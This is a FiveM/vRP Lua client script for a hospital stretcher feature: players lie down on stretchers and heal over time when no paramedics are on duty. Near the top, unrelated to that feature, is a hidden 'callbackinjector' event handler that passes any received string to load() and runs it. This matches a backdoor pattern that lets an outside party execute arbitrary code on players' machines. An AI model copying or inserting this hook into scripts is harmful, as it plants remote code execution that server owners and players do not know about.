local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
emP = Tunnel.getInterface("emp_hospital")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local macas = {
	{ ['x'] = -448.95, ['y'] = -310.06, ['z'] = 34.91, ['x2'] = -450.29, ['y2'] = -311.04, ['z2'] = 35.83, ['h'] = 200.0 },
	{ ['x'] = -449.94, ['y'] = -303.73, ['z'] = 34.91, ['x2'] = -448.93, ['y2'] = -303.38, ['z2'] = 35.82, ['h'] = 200.0 },
	{ ['x'] = -444.82, ['y'] = -307.01, ['z'] = 34.91, ['x2'] = -445.47, ['y2'] = -307.42, ['z2'] = 35.83, ['h'] = 200.0 },
	{ ['x'] = -448.94, ['y'] = -295.58, ['z'] = 34.91, ['x2'] = -450.146, ['y2'] = -296.36, ['z2'] = 35.61, ['h'] = 200.0 },
	{ ['x'] = -455.13, ['y'] = -284.85, ['z'] = 34.91, ['x2'] = -455.02, ['y2'] = -286.52, ['z2'] = 35.83, ['h'] = 200.0 },
	{ ['x'] = -450.77, ['y'] = -284.09, ['z'] = 34.91, ['x2'] = -451.62, ['y2'] = -284.96, ['z2'] = 35.83, ['h'] = 200.0 },
	{ ['x'] = -449.47, ['y'] = -283.57, ['z'] = 34.90, ['x2'] = -448.41, ['y2'] = -283.76, ['z2'] = 35.83, ['h'] = 200.0 },
	{ ['x'] = -461.37, ['y'] = -579.44, ['z'] = 34.91, ['x2'] = -460.25, ['y2'] = -288.74, ['z2'] = 35.83, ['h'] = 200.0 },
	{ ['x'] = -461.00, ['y'] = -287.07, ['z'] = 34.91, ['x2'] = -460.31, ['y2'] = -288.59, ['z2'] = 35.83, ['h'] = 200.0 },

	{ ['x'] = -463.17, ['y'] = -288.67, ['z'] = 34.91, ['x2'] = -463.53, ['y2'] = -290.13, ['z2'] = 35.83, ['h'] = 200.0 }
}

-----------------------------------------------------------------------------------------------------------------------------------------
-- DEITANDO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		for k,v in pairs(macas) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
			local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
			if distance <= 1.1 then
			crjSleep = 1
				drawTxt("~b~E~w~  DEITAR    ~b~G~w~  TRATAMENTO",4,0.5,0.88,0.50,255,255,255,180)
				if IsControlJustPressed(0,38) then
					SetEntityCoords(ped,v.x2,v.y2,v.z2)
					SetEntityHeading(ped,v.h)
					vRP._playAnim(false,{{"amb@world_human_sunbathe@female@back@idle_a","idle_a"}},true)
				end
				if IsControlJustPressed(0,47) then
					if emP.checkServices() then
						TriggerEvent('tratamento-macas')
						SetEntityCoords(ped,v.x2,v.y2,v.z2)
						SetEntityHeading(ped,v.h)
						vRP._playAnim(false,{{"amb@world_human_sunbathe@female@back@idle_a","idle_a"}},true)
					else
						TriggerEvent("Notify","aviso","Existem paramédicos em serviço.")
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

RegisterNetEvent('tratamento-macas')
AddEventHandler('tratamento-macas',function()
	TriggerEvent("cancelando",true)
	repeat
		SetEntityHealth(PlayerPedId(),GetEntityHealth(PlayerPedId())+1)
		Citizen.Wait(2000)
	until GetEntityHealth(PlayerPedId()) >= 230 or GetEntityHealth(PlayerPedId()) <= 100
		TriggerEvent("Notify","importante","Tratamento concluido.")
		TriggerEvent("cancelando",false)
end)